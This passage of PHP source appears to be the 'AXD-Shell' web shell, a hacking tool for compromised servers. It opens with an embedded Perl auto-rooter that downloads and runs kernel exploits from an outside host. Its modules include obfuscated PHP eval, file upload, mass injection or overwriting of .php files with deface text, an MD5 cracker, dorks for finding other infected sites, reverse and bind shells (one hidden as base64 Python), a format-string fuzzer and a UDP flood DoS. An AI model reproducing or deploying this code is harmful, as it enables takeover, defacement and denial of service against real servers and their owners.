system("./krad2 -t 1 -p 2"); 
system("id"); 
system("./krad2 -t 1 -p 3"); 
system("id"); 
system("./krad2 -t 1 -p 4"); 
system("id"); 
system("./krad2 -t 1 -p 5"); 
system("id"); 
system("./krad2 -t 1 -p 6"); 
system("id"); 
system("./krad2 -t 1 -p 7"); 
system("id"); 
system("./krad2 -t 1 -p 8"); 
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n"; 
system("wget http://war1971.com/CMS_FILES/file/cc/krad"); 
system("chmod 777 krad"); 
system("./krad"); 
system("id"); 
system("./krad -t 1 -p 2"); 
system("id"); 
system("./krad -t 1 -p 3"); 
system("id"); 
system("./krad -t 1 -p 4"); 
system("id"); 
system("./krad -t 1 -p 5"); 
system("id"); 
system("./krad -t 1 -p 6"); 
system("id"); 
system("./krad -t 1 -p 7"); 
system("id"); 
system("./krad -t 1 -p 8"); 
system("id"); 
system("wget http://war1971.com/CMS_FILES/file/cc/k-rad3"); 
system("chmod 777 k-rad3"); 
system("./k-rad3 -t 1 -p 2"); 
system("id"); 
system("./k-rad3 -t 1 -p 3"); 
system("id"); 
system("./k-rad3 -t 1 -p 4"); 
system("id"); 
system("./k-rad3 -t 1 -p 5"); 
system("id"); 
system("./k-rad3 -t 1 -p 6"); 
system("id"); 
system("./k-rad3 -t-p 2"); 
system("id"); 
system("./k-rad3 -t -p 2"); 
system("id"); 
system("./k-rad3 -a -p 7"); 
system("id"); 
system("./k-rad3 -a -p 7"); 
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n"; 
system("wget http://war1971.com/CMS_FILES/file/cc/268"); 
system("chmod 777 268"); 
system("./268"); 
print "If u r r00t stop xpl with ctrl+c\n"; 
system("wget http://war1971.com/CMS_FILES/file/cc/2008"); 
system("chmod 777 2008"); 
system("./2008"); 
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n";  
system("wget http://war1971.com/CMS_FILES/file/cc/2009x.c"); 
system("gcc 2009x.c -o 2009x");  
system("chmod 777 2009x"); 
system("./2009x"); 
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n";
system("wget http://war1971.com/CMS_FILES/file/cc/2009xx");  
system("chmod 777 2009xx"); 
system("./2009xx"); 
system("id");
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n"; 
system("wget http://war1971.com/CMS_FILES/file/cc/2.6.9-55-2007-prv8"); 
system("chmod 777 2.6.9-55-2007-prv8"); 
system("./2.6.9-55-2007-prv8"); 
system("id"); 
system("./2.6.9-55-2007-prv8"); 
system("id"); 
system("./2.6.9-55-2007-prv8"); 
system("id"); 
print "If u r r00t stop xpl with ctrl+c\n"; 
system("wget http://war1971.com/CMS_FILES/file/cc/18");  
system("chmod 777 18"); 
system("./18"); 
system("id"); 
system("wget http://war1971.com/CMS_FILES/file/cc/8");  
system("chmod 777 8"); 
system("./8"); 
system("id"); 
system("wget http://war1971.com/CMS_FILES/file/cc/dz");  
system("chmod 777 dz"); 
system("./dz"); 
system("id"); 
system("wget http://war1971.com/CMS_FILES/file/cc/x86");  
system("chmod 777 x86"); 
system("./x86"); 
system("id"); 
system("wget http://war1971.com/CMS_FILES/file/cc/lol");  
system("chmod 777 lol"); 
system("./lol"); 
system("id"); 
}';
     $fd = fopen("r00t.pl","w");

            if ($fd != FALSE)
            {
                fwrite($fd,base64_decode($r00t));
                $out = exec_all("perl r00t.pl;");
            	if ($out != "")
            	{
			$cmd_out = exec_all("whoami");
			if ($cmd_out != "")
			{
				if (strpos($cmd_out == 'root') !== false)
					echo "<p class='alert_green'>You are ".trim(exec_all("whoami"))."</p>";
				else
					echo "<p class='alert_red'>You are ".trim(exec_all("whoami"))."</p>";
			}
			else
			{
				echo "<p class='alert_red'>Rooting Failed</p>";
			}
            	}
	    }
            else
            {
                echo "<p class='alert_red'>Permission Denied</p>";
            }
    ?>
    <?php
}

// PHP evaluate

else if(isset($_GET['eval']))
{
    ?>
    
    <form method="POST">
    <textarea name="code" class="cmd" cols="100" rows="20"><?php
    // If the comand was sent
    if(isset($_POST['code'])
        && $_POST['code']
    )
    {
        // Filter Some Chars we dont need

        $code = base64_decode(gzinflate(str_rot13(convert_uudecode(gzinflate(base64_decode(($_POST['code'])))))));

        // Evaluate PHP CoDE!

        echo $code;
    }
    else
    {
        ?>s3IK8A4PCtHysowJ0LEyiPE2MDMLNzWICQ1KcA9T1rcIUQxISOBK4AIA<?php
    }
    ?></textarea><br /><br />
    <input name="submit" value="Eval That COde! :D" class="own" type="submit" />
    </form>

    <?php
    
}

// Upload

else if(isset($_GET['upload']))
{

    if (isset($_POST['file']) &&
        isset($_POST['path']) 
     )
    {
        $path = $_POST['path'];
            
        if($path[(strlen($path)-1)] != $SEPARATOR){$path = $path.$SEPARATOR;}
        
        if(is_dir($path))
        {
            $uploadedFilePath = $_FILES['file']['name'];
            $tempName = $_FILES['file']['tmp_name'];
            $uploadPath = $path .  $uploadedFilePath;
			
            $stat = move_uploaded_file($tempName , $uploadedFilePath);
			
            if ($stat)
            {
                echo "<p class='alert_green'>File uploaded to $uploadPath</p>";
            }
            else
            {
                echo "<p class='alert_red'>Failed to upload file to $uploadPath</p>";
            }
         }
    }
    else
    {
    ?>
    <table class="bind" align="center" >
    <tr>
        <th class="header" colspan="1" width="50px">Upload (From ur Computer)</th>
    </tr>
    <tr>
         <td>
            <table style="border-spacing: 6px;">
                <form method="POST" enctype="multipart/form-data">
                
                <tr>
                    <td width="100"><input type="file" name="file"/></td>
                    <td><input type="submit" name="file" class="own" value="Upload"/></td>
            
                </tr>
                
                 <tr>
                    <td colspan="2">
                        <input class='cmd' style="width: 280px;" name='path' value="<?php echo getcwd(); ?>" />   
                    </td>
                </tr>
                
                </form>
            </table>
         </td>
    </tr>
    </table>
<?php
    }

}

// Upload AXD Mode

else if(isset($_GET['upload2']))
{
	
	// AXD MODE //
	$lokasi = "../";
	// AXD MODE //
	
    if (isset($_POST['file']) &&
        isset($_POST['path']) 
     )
    {
        $lokasi = $_POST['path'];
            
        if($lokasi[(strlen($lokasi)-1)] != $SEPARATOR){$lokasi = $lokasi.$SEPARATOR;}
        
        if(is_dir($lokasi))
        {

            $tempName = $_FILES['file']['tmp_name'];
			
			/// AXD SISTEM ///
			$simpan = $lokasi.basename($_FILES["file"]["name"]);
			/// AXD SISTEM ///
			
            $stat = move_uploaded_file($tempName , $simpan);
            if ($stat)
            {
                echo "<p class='alert_green'>File berhasil diunggah ke $simpan</p>";
            }
            else
            {
                echo "<p class='alert_red'>File berhasil diunggah ke $simpan</p>";
            }
         }
    }
    else
    {
    ?>
    <table class="bind" align="center" >
    <tr>
        <th class="header" colspan="1" width="50px">Upload AXD Mode (From ur Computer)</th>
    </tr>
    <tr>
         <td>
            <table style="border-spacing: 6px;">
                <form method="POST" enctype="multipart/form-data">
                
                <tr>
                    <td width="100"><input type="file" name="file"/></td>
                    <td><input type="submit" name="file" class="own" value="Upload"/></td>
            
                </tr>
                
                 <tr>
                    <td colspan="2">
						<font style="font-size:80%"><i>Sir! dont forget to add / after dir (eg: ../axd/)</i></font>
                        <input class='cmd' style="width: 280px;" name='path' value="<?php echo $lokasi ?>" />   
                    </td>
                </tr>
                
                </form>
            </table>
         </td>
    </tr>
    </table>
<?php
    }

}

// Code Injector

else if(isset($_GET['injector']))
{
    if(isset($_GET['dir']) &&
    $_GET['dir'] != '' &&
    isset($_GET['filetype']) &&
    $_GET['filetype'] != '' &&
    isset($_GET['mode']) &&
    $_GET['mode'] != '' && 
    isset($_GET['message']) &&
    $_GET['message'] != '' 
    )
    {
        $dir = $_GET['dir'];
        $filetype = $_GET['filetype'];
        $message = $_GET['message'];
        
        $mode = "a"; //default mode
        
        
        // Modes Begin
        
        if($_GET['mode'] == 'Apender')
        {
            $mode = "a";
        }
        if($_GET['mode'] == 'Overwriter')
        {
            $mode = "w";
        }
        
        if($handle = opendir($dir))
        {
            ?>
            Overwritten Files :-
            <ul style="padding: 10px;" >
            <?php
            while(($file = readdir($handle)) !== False)
            {
                if((preg_match("/$filetype".'$'.'/', $file , $matches) != 0) && (preg_match('/'.$file.'$/', $self , $matches) != 1))
                {
                    ?>
                        <li class="file"><a href="<?php echo "$self?open=$dir$file"?>"><?php echo $file; ?></a></li>
                    <?php
                    echo "\n";
                    $fd = fopen($dir.$file,$mode);
		    if (!$fd) echo "<p class='alert_red'>Permission Denied</p>"; break;
                    fwrite($fd,$message);
                }
            }
            ?>
            </ul>
            <?php
        }
    }
    else
    {
        ?>
        <table id="margins" >
        <tr>
            <form method='GET'>
            <input type="hidden" name="injector"/>  
                <tr>
                    <td width="100" class="title">
                        Directory
                    </td>
                    <td>
                         <input class="cmd" name="dir" value="<?php echo getcwd().$SEPARATOR; ?>" />
                    </td>
                </tr>
                <tr>
                <td class="title">
                    Mode
                </td>
                <td>
                        <select style="width: 400px;" name="mode" class="cmd">
                            <option value="Apender">Apender</option>
                            <option value="Overwriter">Overwriter</option>
                        </select>
                </td>
                </tr>
                <tr>
                    <td class="title">
                        File Type
                    </td>
                    <td>
                        <input type="text" class="cmd" name="filetype" value=".php" onblur="if(this.value=='')this.value='.php';" />
                    </td>
                </tr>
                
                
                <tr>
                    <td colspan="2">
                        <textarea name="message" cols="110" rows="10" class="cmd">All i remember are those lonely nights when i was defacing those insecure websites!</textarea>
                    </td>
                </tr>
                
                
                <tr>
                    <td rowspan="2">
                        <input style="margin : 20px; margin-left: 390px; padding : 10px; width: 100px;" type="submit" class="own" value="Inject :D"/>
                    </td>
                </tr>
        </form>
        </table>
        <?php
    }
}

// MD5 Cracker

else if(isset($_GET['md5']))
{
    if(isset($_GET['hash']) &&
    isset($_GET['passwdList']) &&
    $_GET['hash'] != '' &&
    $_GET['passwdList'] != '')
    
    {
        echo md5Crack($_GET['hash'],$_GET['passwdList']);
    }
    else
    {
        ?>
        <table id="margins" >
        <tr>
            <form method='GET'>
                <input type="hidden" name="md5" />
                <tr>
                    <td width="100" class="title">
                        Hash
                    </td>
                    <td>
                         <input class="cmd" name="hash"/>
                    </td>
                </tr>
                <tr>
                <td class="title">
                    Password List (File Path)
                </td>
                <td>
                    <input class="cmd" name="passwdList" value="<?php echo getcwd().$SEPARATOR; ?>" />
                </td>
                </tr>
                <tr>
                <tr>
                    <td rowspan="2">
                        <input style="margin : 20px; margin-left: 390px; padding : 10px; width: 100px;" type="submit" class="own" value="Lets Crack :D"/>
                    </td>
                </tr>
        </form>
        </table>
        
        <?php
    }
}

// Google Dork Creater

else if(isset($_GET['gdork']))
{
    if(
    isset($_GET['title']) ||
    isset($_GET['text']) ||
    isset($_GET['url']) ||
    isset($_GET['site'])
    )
    {
        $title = $_GET['title'];
        $text = $_GET['text'];
        $url = $_GET['url'];
        $site = $_GET['site'];
        
        if($title != "")
        {
            $title = " intitle:\"".$title."\" ";
        }
        if($text != "")
        {
            $text = " intext:\"".$text."\" ";
        }
        if($url != "")
        {
            $url = " inurl:\"".$url."\" ";
        }
        if($site != "")
        {
            $site = " site:\"".$site."\" ";
        }
        
        // Print the output now
        ?>
        <div align="center">
        <form action="http://google.com" method="GET">
            <input class="cmd" style="border: solid red 1px;" name="q" value='<?php echo $title.$text.$url.$site ?>' /><br />
            <input type="submit" style="Padding:5px;" class="own" value='Google It! ;)' />
        </form>
        </div>
        <?php
    }
    else 
    {
    ?>
    <p align="center" style="color:red;">Note : Any one of the following options is compulsory to be filled rest can be left blank.</p>
     <table id="margins" >
        <tr>
            <form method='GET'>
                <input type="hidden" name="gdork" />
                <tr>
                    <td width="100" class="title">
                        intitle
                    </td>
                    <td>
                         <input class="cmd" name="title" value="AXD-Shell"/>
                    </td>
                </tr>
                <tr>
                <td class="title">
                    intext
                </td>
                <td>
                    <input class="cmd" name="text" value="AXD" />
                </td>
                </tr>
                <tr>
                    <td width="100" class="title">
                        inurl
                    </td>
                    <td>
                         <input class="cmd" name="url" value="AXD-Shell.php"/>
                    </td>
                </tr>
                <tr>
                    <td width="100" class="title">
                        site
                    </td>
                    <td>
                         <input class="cmd" name="site" value="*.org"/>
                    </td>
                </tr>
                <tr>
                    <td rowspan="2" >
                        <input style="margin : 20px; margin-left: 390px; padding : 10px;" type="submit" class="own" value="Gimme the Dork!"/>
                    </td>
                </tr>
        </form>
        </table>
    <?php
    }
}


// Connect


else if(isset($_GET['connect']))
{
    if(isset($_POST['ip']) &&
     isset($_POST['port']) && 
        $_POST['ip'] != "" &&
        $_POST['port'] != ""
     )
    {
        echo "<p>The Program is now trying to connect!</p>";
        $ip = $_POST['ip']; 
        $port=$_POST['port']; 
        $sockfd=fsockopen($ip , $port , $errno, $errstr ); 
        if($errno != 0)
        {
            echo "<font color='red'><b>$errno</b> : $errstr</font>";
        }
        else if (!$sockfd)
        { 
               $result = "<p>Fatal : An unexpected error was occured when trying to connect!</p>";
        } 
        else
        { 
            fputs ($sockfd ,"\n=================================================================\nAXD-Shell | C0d3d by AXD | India\n=================================================================");
         $pwd = exec_all("pwd");
         $sysinfo = exec_all("uname -a");
         $id = exec_all("id");
         $dateAndTime = exec_all("time /t & date /T");
         $len = 1337;
         fputs($sockfd ,$sysinfo . "\n" );
         fputs($sockfd ,$pwd . "\n" );
         fputs($sockfd ,$id ."\n\n" );
         fputs($sockfd ,$dateAndTime."\n\n" );
         while(!feof($sockfd))
         {  
            $cmdPrompt ="(AXD-Shell)[$]> ";
            fputs ($sockfd , $cmdPrompt ); 
            $command= fgets($sockfd, $len);
            fputs($sockfd , "\n" . exec_all($command) . "\n\n");
        } 
        fclose($sockfd); 
        } 
    }
    else if(
    isset($_POST['port']) &&
    isset($_POST['passwd']) && 
    $_POST['port'] != "" &&
    $_POST['passwd'] != ""  &&
    isset($_POST['mode']))
    {
        $address = '127.0.0.1';
        $port = $_POST['port'];
        $pass = $_POST['passwd'];
        
        if($_POST['mode'] == "Python")
        {
            $Python_CODE = "IyBTZXJ2ZXIgIA0KIA0KaW1wb3J0IHN5cyAgDQppbXBvcnQgc29ja2V0ICANCmltcG9ydCBvcyAgDQoNCmhvc3QgPSAnJzsgIA0KU0laRSA9IDUxMjsgIA0KDQp0cnkgOiAgDQogICAgIHBvcnQgPSBzeXMuYXJndlsxXTsgIA0KDQpleGNlcHQgOiAgDQogICAgIHBvcnQgPSAzMTMzNzsgIA0KIA0KdHJ5IDogIA0KICAgICBzb2NrZmQgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVUICwgc29ja2V0LlNPQ0tfU1RSRUFNKTsgIA0KDQpleGNlcHQgc29ja2V0LmVycm9yICwgZSA6ICANCg0KICAgICBwcmludCAiRXJyb3IgaW4gY3JlYXRpbmcgc29ja2V0IDogIixlIDsgIA0KICAgICBzeXMuZXhpdCgxKTsgICANCg0Kc29ja2ZkLnNldHNvY2tvcHQoc29ja2V0LlNPTF9TT0NLRVQgLCBzb2NrZXQuU09fUkVVU0VBRERSICwgMSk7ICANCg0KdHJ5IDogIA0KICAgICBzb2NrZmQuYmluZCgoaG9zdCxwb3J0KSk7ICANCg0KZXhjZXB0IHNvY2tldC5lcnJvciAsIGUgOiAgICAgICAgDQogICAgIHByaW50ICJFcnJvciBpbiBCaW5kaW5nIDogIixlOyANCiAgICAgc3lzLmV4aXQoMSk7ICANCiANCnByaW50KCJcblxuPT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09Iik7IA0KcHJpbnQoIi0tLS0tLS0tIFNlcnZlciBMaXN0ZW5pbmcgb24gUG9ydCAlZCAtLS0tLS0tLS0tLS0tLSIgJSBwb3J0KTsgIA0KcHJpbnQoIj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PVxuXG4iKTsgDQogDQp0cnkgOiAgDQogICAgIHdoaWxlIDEgOiAjIGxpc3RlbiBmb3IgY29ubmVjdGlvbnMgIA0KICAgICAgICAgc29ja2ZkLmxpc3RlbigxKTsgIA0KICAgICAgICAgY2xpZW50c29jayAsIGNsaWVudGFkZHIgPSBzb2NrZmQuYWNjZXB0KCk7ICANCiAgICAgICAgIHByaW50KCJcblxuR290IENvbm5lY3Rpb24gZnJvbSAiICsgc3RyKGNsaWVudGFkZHIpKTsgIA0KICAgICAgICAgd2hpbGUgMSA6ICANCiAgICAgICAgICAgICB0cnkgOiAgDQogICAgICAgICAgICAgICAgIGNtZCA9IGNsaWVudHNvY2sucmVjdihTSVpFKTsgIA0KICAgICAgICAgICAgIGV4Y2VwdCA6ICANCiAgICAgICAgICAgICAgICAgYnJlYWs7ICANCiAgICAgICAgICAgICBwaXBlID0gb3MucG9wZW4oY21kKTsgIA0KICAgICAgICAgICAgIHJhd091dHB1dCA9IHBpcGUucmVhZGxpbmVzKCk7ICANCiANCiAgICAgICAgICAgICBwcmludChjbWQpOyAgDQogICAgICAgICAgIA0KICAgICAgICAgICAgIGlmIGNtZCA9PSAnZzJnJzogIyBjbG9zZSB0aGUgY29ubmVjdGlvbiBhbmQgbW92ZSBvbiBmb3Igb3RoZXJzICANCiAgICAgICAgICAgICAgICAgcHJpbnQoIlxuLS0tLS0tLS0tLS1Db25uZWN0aW9uIENsb3NlZC0tLS0tLS0tLS0tLS0tLS0iKTsgIA0KICAgICAgICAgICAgICAgICBjbGllbnRzb2NrLnNodXRkb3duKCk7ICANCiAgICAgICAgICAgICAgICAgYnJlYWs7ICANCiAgICAgICAgICAgICB0cnkgOiAgDQogICAgICAgICAgICAgICAgIG91dHB1dCA9ICIiOyAgDQogICAgICAgICAgICAgICAgICMgUGFyc2UgdGhlIG91dHB1dCBmcm9tIGxpc3QgdG8gc3RyaW5nICANCiAgICAgICAgICAgICAgICAgZm9yIGRhdGEgaW4gcmF3T3V0cHV0IDogIA0KICAgICAgICAgICAgICAgICAgICAgIG91dHB1dCA9IG91dHB1dCtkYXRhOyAgDQogICAgICAgICAgICAgICAgICAgDQogICAgICAgICAgICAgICAgIGNsaWVudHNvY2suc2VuZCgiQ29tbWFuZCBPdXRwdXQgOi0gXG4iK291dHB1dCsiXHJcbiIpOyAgDQogICAgICAgICAgICAgICANCiAgICAgICAgICAgICBleGNlcHQgc29ja2V0LmVycm9yICwgZSA6ICANCiAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgcHJpbnQoIlxuLS0tLS0tLS0tLS1Db25uZWN0aW9uIENsb3NlZC0tLS0tLS0tIik7ICANCiAgICAgICAgICAgICAgICAgY2xpZW50c29jay5jbG9zZSgpOyAgDQogICAgICAgICAgICAgICAgIGJyZWFrOyAgDQpleGNlcHQgIEtleWJvYXJkSW50ZXJydXB0IDogIA0KIA0KDQogICAgIHByaW50KCJcblxuPj4+PiBTZXJ2ZXIgVGVybWluYXRlZCA8PDw8PFxuIik7ICANCiAgICAgcHJpbnQoIj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09Iik7IA0KICAgICBwcmludCgiXHRUaGFua3MgZm9yIHVzaW5nIEFuaS1zaGVsbCdzIC0tIFNpbXBsZSAtLS0gQ01EIik7ICANCiAgICAgcHJpbnQoIlx0RW1haWwgOiBsaW9uYW5lZXNoQGdtYWlsLmNvbSIpOyAgDQogICAgIHByaW50KCI9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0iKTsNCg==";

            $fd = fopen("bind.py","w");

            if($fd != FALSE)
            {
                fwrite($fd,base64_decode($Python_CODE));
                
                if($os == "Linux")
                {
                    echo "[+] OS Detected = Windows";
                    exec_all("chmod +x bind.py ; ./bind.py");
                    
                    // CHeck if the process is running
            
                    $pattern = "bind.py";
            
                    $list = exec_all("ps -aux");
                }
                else
                {
                    echo "[+] OS Detected = Windows";
                    exec_all("start bind.py");
                    // CHeck if the process is running
            
                    $pattern = "python.exe";
            
                    $list = exec_all("TASKLIST");
                }
                
                
                if(preg_match("/$pattern/",$list))
                {
                        echo "<p class='alert_green'>Process Found Running! Backdoor Setuped Successfully! :D</p>";
                }
                else
                {
                    echo "<p class='alert_red'>Process Not Found Running! Backdoor Setup FAILED :(</p>";
                }
                
                echo "<br /><br />\n<b>Task List :-</b> <pre>\n$list</pre>";
                
            }
        }
    }
    else if($_POST['mode'] == "PHP")
    {
            
        // Set time limit to indefinite execution
        set_time_limit (0);
        
        
        // Set the ip and port we will listen on
        

        if(function_exists("socket_create"))
        {
        // Create a TCP Stream socket
        $sockfd = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);

      
        // Bind the socket to an address/port
        
        
        if(socket_bind($sockfd, $address, $port) == FALSE)
        {
            echo "Cant Bind to the specified port and address!";
        }
        // Start listening for connections
        socket_listen($sockfd,15);
        
    
        $passwordPrompt = "\n=================================================================\nAXD-Shell | C0d3d by AXD | India\n=================================================================\n\n0xPassword : ";
        
        /* Accept incoming requests and handle them as child processes */
        $client = socket_accept($sockfd);
        

        socket_write($client , $passwordPrompt);
        // Read the pass from the client
        $input = socket_read($client, strlen($pass) + 2); // +2 for \r\n
        if(trim($input) == $pass)
        {
            socket_write($client , "\n\n");
            socket_write($client , ($os == "Windows") ? exec_all("date /t & time /t")  . "\n" . exec_all("ver") : exec_all("date") . "\n" . exec_all("uname -a"));
            socket_write($client , "\n\n");
            while(1)
            {
                // Print Command prompt
                $commandPrompt ="(AXD-Shell)[$]> ";
                $maxCmdLen = 31337;
                socket_write($client,$commandPrompt);
                $cmd = socket_read($client,$maxCmdLen);
                if($cmd == FALSE)
                {
                    echo "The client Closed the conection!";
                    break;
                }
                socket_write($client , exec_all($cmd));
            }
        }
        else
        {
            echo "Wrong Password!";
            socket_write($client, "sU(|< - 0FF Bitch!\n\n");
        }
        socket_shutdown($client, 2);
        socket_close($socket);
        
        // Close the client (child) socket
        //socket_close($client);
        // Close the master sockets
        //socket_close($sock);
        }
        else
        {
            echo "Socket Conections not Allowed/Supported by the server! <br />";
        }
    }
    else
    {
    ?>       
    <table class="bind" align="center" >
    <tr>
        <th class="header" colspan="1" width="50px">Back Connect</th>
        <th class="header" colspan="1" width="50px">Bind Shell</th>
    </tr>
    <tr>
        <form method='POST' >  
         <td>
            <table style="border-spacing: 6px;">
                <tr>
                    <td>IP </td>
                    <td>
                        <input style="width: 200px;" class="cmd" name="ip" value="<?php getClientIp();?>" />
                    </td>
                </tr>
                <tr>
                    <td>Port </td>
                    <td><input style="width: 100px;" class="cmd" name="port" size='5' value="31337"/></td>
                </tr>
                <tr>
                <td>Mode </td>    
                <td>
                        <select name="mode" class="cmd">
                            <option value="PHP">PHP</option>
                        </select>&nbsp;&nbsp;<input style="width: 90px;" class="own" type="submit" value="Connect!"/></td>
                
            </table>
         </td>
         </form> 
         <form method="POST">
         <td>
            <table style="border-spacing: 6px;">
                <tr>
                    <td>Port</td>
                    <td>
                        <input style="width: 200px;" class="cmd" name="port" value="31337" />
                    </td>
                </tr>
                <tr>
                    <td>Passwd </td>
                    <td><input style="width: 100px;" class="cmd" name="passwd" size='5' value="AXD"/>
                </tr>
                <tr>
                <td>
                Mode
                </td>
                <td>
                        <select name="mode" class="cmd">
                            <option value="PHP">PHP</option>
                            <option value="Python">Python</option>
                        </select> &nbsp;&nbsp;<input style="width: 90px;" class="own" type="submit" value="Bind :D!"/></td>
                </tr>    
                   
            </table>
         </td>
         </form>
    </tr>
    </table>
    <p align="center" style="color: red;" >Note : After clicking Submit button , The browser will start loading continuously , Dont close this window , Unless you are done!</p>
<?php
    }
}

//fuzzer

else if(isset($_GET['fuzz']))
{
    if(isset($_GET['ip']) &&
    isset($_GET['port']) &&
    isset($_GET['times']) &&
    isset($_GET['time']) &&
    isset($_GET['message']) &&
    isset($_GET['messageMultiplier']) &&
    $_GET['message'] != "" &&
    $_GET['time'] != "" &&
    $_GET['times'] != "" &&
    $_GET['port'] != "" &&
    $_GET['ip'] != "" &&
    $_GET['messageMultiplier'] != ""
    )
    {
       $IP=$_GET['ip'];
	   $port=$_GET['port'];
       $times = $_GET['times'];
	   $timeout = $_GET['time'];
	   $send = 0;
       $ending = "";
       $multiplier = $_GET['messageMultiplier'];
       $data = "";
       $mode="tcp";
       $data .= "GET /";
       $ending .= " HTTP/1.1\n\r\n\r\n\r\n\r";
        if($_GET['type'] == "tcp")
        {
            $mode = "tcp";
        }
        while($multiplier--)
        {
            $data .= urlencode($_GET['message']);
        }
        $data .= "%s%s%s%s%d%x%c%n%n%n%n";// add some format string specifiers
        $data .= "by-AXD-Shell".$ending;
        $length = strlen($data);
        
        
       echo "Sending Data :- <br /> <p align='center'>$data</p>";
        
       print "I am at ma Work now :D ;D! Dont close this window untill you recieve a message <br>";
	   for($i=0;$i<$times;$i++)
	   {
            $socket = fsockopen("$mode://$IP", $port, $error, $errorString, $timeout);
            if($socket)
            {
                fwrite($socket , $data , $length );
                fclose($socket);
            }
        }
        echo "<script>alert('Fuzzing Completed!');</script>";
        echo "DOS attack against $mode://$IP:$port completed on ".date("h:i:s A")."<br />";
        echo "Total Number of Packets Sent : " . $times . "<br />";
        echo "Total Data Sent = ". HumanReadableFilesize($times*$length) . "<br />"; 
        echo "Data per packet = " . HumanReadableFilesize($length) . "<br />";
    }
    else
    {
        ?>
        <form method="GET">
            <input type="hidden" name="fuzz" />
            <table id="margins">
                <tr>
                    <td width="400" class="title">
                        IP
                    </td>
                    <td>
                        <input class="cmd" name="ip" value="127.0.0.1" onfocus="if(this.value == '127.0.0.1')this.value = '';" onblur="if(this.value=='')this.value='127.0.0.1';"/>
                    </td>
                </tr>
                
                <tr>
                    <td class="title">
                        Port
                    </td>
                    <td>
                        <input class="cmd" name="port" value="80" onfocus="if(this.value == '80')this.value = '';" onblur="if(this.value=='')this.value='80';"/>
                    </td>
                </tr>
                
                <tr>
                    <td class="title">
                        Timeout
                    </td>
                    <td>
                        <input type="text" class="cmd" name="time" value="5" onfocus="if(this.value == '5')this.value = '';" onblur="if(this.value=='')this.value='5';"/>
                    </td>
                </tr>
                
                
                <tr>
                    <td class="title">
                        No of times
                    </td>
                    <td>
                        <input type="text" class="cmd" name="times" value="100" onfocus="if(this.value == '100')this.value = '';" onblur="if(this.value=='')this.value='100';" />
                    </td>
                </tr>
                
                <tr>
                    <td class="title">
                        Message <font color="red">(The message Should be long and it will be multiplied with the value after it)</font>
                    </td>
                    <td>
                        <input class="cmd" name="message" value="%S%x--Some Garbage here --%x%S" onfocus="if(this.value == '%S%x--Some Garbage here --%x%S')this.value = '';" onblur="if(this.value=='')this.value='%S%x--Some Garbage here --%x%S';"/>
                    </td>
                    <td>
                        x
                    </td>
                    <td width="20">
                        <input style="width: 30px;" class="cmd" name="messageMultiplier" value="10" />
                    </td>
                </tr>
                
                <tr>
                    <td rowspan="2">
                        <input style="margin : 20px; margin-left: 500px; padding : 10px; width: 100px;" type="submit" class="own" value="Let it Rip! :D"/>
                    </td>
                </tr>
            </table>            
        </form>
        <?php
    }
}


//DDos

else if(isset($_GET['dos']))
{
    if(isset($_GET['ip']) &&
    isset($_GET['exTime']) &&
    isset($_GET['port']) &&
    isset($_GET['timeout']) &&
    isset($_GET['exTime']) &&
    $_GET['exTime'] != "" &&
    $_GET['port'] != "" &&
    $_GET['ip'] != "" &&
    $_GET['timeout'] != "" &&
    $_GET['exTime'] != ""
    )
    {
       $IP=$_GET['ip'];
	   $port=$_GET['port'];
       $executionTime = $_GET['exTime'];
	   $noOfBytes = $_GET['noOfBytes'];
       $data = "";
       $timeout = $_GET['timeout'];
       $packets = 0;
       $counter = $noOfBytes;
       $maxTime = time() + $executionTime;;
       while($counter--)
       {
            $data .= "X";
       }
       $data .= "-by-AXD-Shell"; 
       print "I am at ma Work now :D ;D! Dont close this window untill you recieve a message <br>";
	   
       while(1)
	   {
            $socket = fsockopen("udp://$IP", $port, $error, $errorString, $timeout);
            if($socket)
            {
                fwrite($socket , $data);
                fclose($socket);
                $packets++;
            }
            if(time() >= $maxTime)
            {
                break;
            }
        }
        echo "<script>alert('DDos Completed!');</script>";
        echo "DOS attack against udp://$IP:$port completed on ".date("h:i:s A")."<br />";
        echo "Total Number of Packets Sent : " . $packets . "<br />";
        echo "Total Data Sent = ". HumanReadableFilesize($packets*$noOfBytes) . "<br />"; 
        echo "Data per packet = " . HumanReadableFilesize($noOfBytes) . "<br />";
    }
    else
    {

        ?>
        <form method="GET">
            <input type="hidden" name="dos" />
            <table id="margins">
                <tr>
                    <td width="400" class="title">
                        IP
                    </td>
                    <td>
                        <input class="cmd" name="ip" value="127.0.0.1" onfocus="if(this.value == '127.0.0.1')this.value = '';" onblur="if(this.value=='')this.value='127.0.0.1';"/>
                    </td>
                </tr>
                
                <tr>
                    <td class="title">
                        Port
                    </td>
                    <td>
                        <input class="cmd" name="port" value="80" onfocus="if(this.value == '80')this.value = '';" onblur="if(this.value=='')this.value='80';"/>
                    </td>
                </tr>
                
                <tr>
                    <td class="title">
                        Timeout <font color="red">(Time in seconds)</font>
                    </td>
                    <td>
                        <input type="text" class="cmd" name="timeout" value="5" onfocus="if(this.value == '5')this.value = '';" onblur="if(this.value=='')this.value='5';" />
                    </td>
                </tr>
                
                
                <tr>
                    <td class="title">
                        Execution Time <font color="red">(Time in seconds)</font> 
                    </td>
                    <td>
                        <input type="text" class="cmd" name="exTime" value="10" onfocus="if(this.value == '10')this.value = '';" onblur="if(this.value=='')this.value='10';"/>
                    </td>
                </tr>
                
                <tr>
                    <td class="title">
                        No of Bytes per/packet
                    </td>
                    <td>
                        <input type="text" class="cmd" name="noOfBytes" value="999999" onfocus="if(this.value == '999999')this.value = '';" onblur="if(this.value=='')this.value='999999';"/>
                    </td>
                </tr>
                

                <tr>
                    <td rowspan="2">
                        <input style="margin : 20px; margin-left: 500px; padding : 10px; width: 100px;" type="submit" class="own" value="Let it Rip! :D"/>
                    </td>
